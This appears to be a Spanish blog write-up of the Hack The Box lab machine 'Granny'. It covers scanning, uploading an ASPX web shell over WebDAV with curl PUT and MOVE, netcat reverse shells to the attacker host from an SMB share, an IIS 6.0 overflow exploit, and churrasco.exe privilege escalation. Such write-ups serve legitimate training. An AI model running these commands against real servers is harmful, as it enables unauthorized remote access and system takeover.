---
layout: post
title: "Write Up Granny."
subtitle: "Starting-Point"
category: Blog
tags: [Easy,Genin,Windows,HTB,RCE,Token,CVE,WebDav,ASP,IIS,Web,Vulnerability-Assessment,Outdated-Software,Reconnaissance,Arbitrary-File-Upload,Misconfiguration,Churrasco,OSCP,eWPT,eJPTv2]
image:
  path: /assets/img/granny/Captura%20de%20pantalla%20(304).png
---

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconnaissance


### nmap


```bash
sudo nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.10.15 -oG allports
```
![list](/assets/img/granny/Parrot-2022-12-17-16-09-07.png){:.lead width="800" height="100" loading="lazy"}


### Services and Versions


```bash
nmap -sCV p80 10.10.10.15 -oN target
```

![list](/assets/img/granny/Parrot-2022-12-17-16-11-10.png){:.lead width="800" height="100" loading="lazy"}


***
## Vulnerability Analysis


### HTTP TCP 80


Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros.e ispeccionamos la web, ademas de las tecnologias de la ip ataves de la terminal o via web esto lo hacemos con wapalizzer o whatweb.


![list](/assets/img/granny/Parrot-2022-12-17-16-11-32.png){:.lead width="800" height="100" loading="lazy"}


Con el resultado del scaneo de nmap sabemos que estamos ante una tecnologia llamada `WebDav` que es protoclo que nos permite gusrdar, mover, etc achivos sin depender de un servidor web asi que con serchsploit procedemos a buscar alguna vulnerabilidad y tambien buscaremos `IIS 6.0`.


![list](/assets/img/granny/Parrot-2022-12-17-16-17-27.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
WebDav


![list](/assets/img/granny/Parrot-2022-12-17-16-22-00.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
IIS 6.0


Con davtest vamos hacer un pequeño test oara ver opciones tenemos disponibles.


![list](/assets/img/granny/Parrot-2022-12-17-16-26-17.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
Las que estan habilitadas son las que dicen `SUCCEED`.


Con eso en mete vamos a usar `PUT` para depositar algunos binarios como lo es cmd.aspx en el servidor. 


Claro pero como vimos con davtest no podemos subir el `cmd.aspx` pero no hay ningun problema lo que vamos hacer es cambiarles el nombre a cmd.txt y luego como el parametro `MOVE` loes cambiaremos el nombre para vuelva a cmd.aspx respectivamente. 


```bash
curl -s -X PUT http://10.10.10.5/cmd.txt -d @cmd.txt
```


```bash
curl -s -X Move "Destination:http://10.10.10.5/cmd.aspx" http://10.10.10.5/cmd.txt 
```

{:.note}
Subimos y movemos cmd.aspx.


## Exploitation


Luego  nos subimo con smmbserver nos compartimos el netcat y nos lo ejecutamos eso no dara la reverse-shell.


![list](/assets/img/granny/Parrot-2022-12-17-17-22-56.png){:.lead width="800" height="100" loading="lazy"}


```bash
//10.10.16.14/SmbFolder/nc.exe -e cmd 10.10.16.14 443 
```

{:.note}
Debemos estar a la escucha por el puerto 443.


U otra forma era cuando buscamos vulnerabilidaes al pricio de IIS 6.0 es hora de usarlo es el que dice remote buffer overflow que le vamos a cambiar el nombre y lo vamos a ejecutar.


```bash
python2 exploit.py 10.10.10.5 80 10.10.16.14 443 
```

{:.note}
Debemos estar a la escucha por el puerto 443 pero aun no podemos ver la flag del usuario de bajos privileguios.


***
## Escalacion de privilegios 


Siempre es bueno ejecutar `WimEnum` Y `ADEnum` para monitorizar y ver los posibles vectores para escalar de privilegios.


Una ves dentro hacemos un whoami /priv para ver que privileguios podemos explotar, pero como es un `Windows Server 2013` no podemos usar el `JuicePotato` sino una variante que llama [churrasco.exe] la cual la vamos a descargar para luego subirla ala maquina victima  con `cerutil`s y ejecutarla.


[churrasco.exe]:(https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/)


![list](/assets/img/granny/Parrot-2022-12-17-17-26-57.png){:.lead width="800" height="100" loading="lazy"}


![list](/assets/img/granny/Parrot-2022-12-17-17-46-21.png){:.lead width="800" height="100" loading="lazy"}



```bash
churrasco.exe //10.10.16.14/SmbFolder/nc.exe -e cmd 10.10.16.14 443
```


{:.note}
En este punto podemos subir el netcat o con smbserver atraves de un recurso compartido otorgarnos una reverse-shell y no olvidanos que debemos estar a la escucha con netcat en el puerto 443.


![list](/assets/img/granny/Parrot-2022-12-17-17-59-52.png){:.lead width="800" height="100" loading="lazy"}


De una ves podemos buscar la flag del usuario de bajos privileguios que estaba en `Documentos and Settings`.


![list](/assets/img/granny/Parrot-2022-12-17-18-07-42.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
La flag esta en el ecritorio del usuario priviligiado.

***
```bash
🎉 Felicitaciones ya has comprometido Granny de Hack The Box. 🎉
```
{:.centered}
***

Back to [Certification eJPTv2](2023-07-03-Road-to-eJPTv2.md){:.heading.flip-title}
{:.read-more}

***
Back to [Certification eWPT](){:.heading.flip-title}
{:.read-more}

***
Back to [Certification OSCP](){:.heading.flip-title}
{:.read-more}
